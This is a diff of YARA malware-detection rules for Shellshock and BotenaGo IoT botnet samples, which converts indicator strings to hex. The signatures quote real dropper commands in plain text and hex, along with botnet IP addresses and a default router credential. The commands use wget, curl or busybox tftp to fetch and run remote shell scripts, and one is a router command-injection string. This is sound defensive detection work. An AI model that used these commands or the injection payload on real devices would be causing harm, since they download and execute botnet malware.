@@ -90,7 +90,7 @@ rule Mirai_DemonBot_SecH
     ($cc and $file_str) or any of ($str*)
 }
 
-rule Shellshock {
+rule Shellshock_Generic {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
@@ -99,11 +99,14 @@ rule Shellshock {
     date = "12/11/2021"
     target = "File, memory"
   strings:
-    $addr_1 = "http://195.58.39.37/bins.sh"
-    $addr_2 = "185.172.110.209"
-    $addr_3 = "195.58.39.37"
-    $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
-    $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
+    $addr_1 = { 68 74 74 70 3A 2F 2F 31 39 35 2E 35 38 2E 33 39 2E 33 37 2F 62 69 6E 73 2E 73 68 } // "http://195.58.39.37/bins.sh"
+    $addr_2 = { 31 38 35 2E 31 37 32 2E 31 31 30 2E 32 30 39 } // "185.172.110.209"
+    $addr_3 = { 31 39 35 2E 35 38 2E 33 39 2E 33 37 } // "195.58.39.37"
+    // $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
+    // $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
+    $cmd_1 = { 77 67 65 74 20 68 74 74 70 3A 2F 2F 31 39 35 2E 35 38 2E 33 39 2E 33 37 2F 62 69 6E 73 2E 73 68 } // "wget http://195.58.39.37/bins.sh"
+    $cmd_2 = { 63 75 72 6C 20 2D 4F 20 68 74 74 70 3A 2F 2F 31 39 35 2E 35 38 2E 33 39 2E 33 37 2F 62 69 6E 73 2E 73 68 } // "curl -O http://195.58.39.37/bins.sh"
+    $cmd_3 = { 63 68 6D 6F 64 20 37 37 37 20 74 66 74 70 31 2E 73 68 3B 20 73 68 20 74 66 74 70 31 2E 73 68 3B 20 62 75 73 79 62 6F 78 20 74 66 74 70 20 2D 72 20 74 66 74 70 32 2E 73 68 } // "chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh"
   condition:
     any of them
 }
@@ -124,7 +127,7 @@ rule Tsunami_1 {
 }
 
 
-rule BotenaGo {
+rule BotenaGo_Generic {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
@@ -133,11 +136,11 @@ rule BotenaGo {
     reference = "https://otx.alienvault.com/indicator/file/0c395715bfeb8f89959be721cd2f614d2edb260614d5a21e90cc4c142f5d83ad"
     reference = "https://cybersecurity.att.com/blogs/labs-research/att-alien-labs-finds-new-golang-malwarebotenago-targeting-millions-of-routers-and-iot-devices-with-more-than-30-exploits"
   strings:
-    $1 = "/bin/busybox wget -g 159.65.232.56 -l /tmp/xvg -r /xvg; /bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei"
-    $2 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://"
-    $3 = "107.172.30.215"
-    $4 = "159.65.232.56"
-    $5 = "http://adminisp:adminispbad"
+    $addr_1 = { 31 30 37 2E 31 37 32 2E 33 30 2E 32 31 35 } // "107.172.30.215"
+    $addr_2 = { 31 35 39 2E 36 35 2E 32 33 32 2E 35 36 } // "159.65.232.56"
+    $addr_3 = { 68 74 74 70 3A 2F 2F 61 64 6D 69 6E 69 73 70 3A 61 64 6D 69 6E 69 73 70 62 61 64 } // "http://adminisp:adminispbad"
+    $cc_1 = { 58 57 65 62 50 61 67 65 4E 61 6D 65 3D 64 69 61 67 26 64 69 61 67 5F 61 63 74 69 6F 6E 3D 70 69 6E 67 26 77 61 6E 5F 63 6F 6E 6C 69 73 74 3D 30 26 64 65 73 74 5F 68 6F 73 74 3D 60 62 75 73 79 62 6F 78 2B 77 67 65 74 2B 68 74 74 70 3A 2F 2F } // "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://"
+    $cmd_1 = { 2F 62 69 6E 2F 62 75 73 79 62 6F 78 20 63 68 6D 6F 64 20 37 37 37 20 2A 20 2F 74 6D 70 2F 78 76 67 3B 20 2F 74 6D 70 2F 78 76 67 20 73 65 6C 66 72 65 70 2E 68 75 61 77 65 69 } // "/bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei"
   condition:
     any of them
 }
@@ -153,6 +156,7 @@ rule Mirai_variant_1 {
     description = "Strings from dumped mem"
     hash = "a9878bffe5e771bd09109df185dc41883ca0a560bb7b635abddc4259995ec37"
   strings:
+    // false positive /usr/local/lib/python3.8/dist-packages/zelos/ext/env/linux-armv7/lib/libc.so.0
     $cc = { 31 39 34 2E 37 36 2E 32 32 36 2E 32 34 30 } // "194.76.226.240"
     $s1 = { 44 65 76 69 63 65 20 43 6F 6E 6E 65 63 74 65 64 3A 20 25 73 20 7C 20 50 6F 72 74 3A 20 25 73 20 7C 20 41 72 63 68 3A 20 25 73 } // "Device Connected: %s | Port: %s | Arch: %s"
     $s2 = { 54 53 6F 75 72 63 65 20 45 6E 67 69 6E 65 20 51 75 65 72 79 } // "TSource Engine Query"
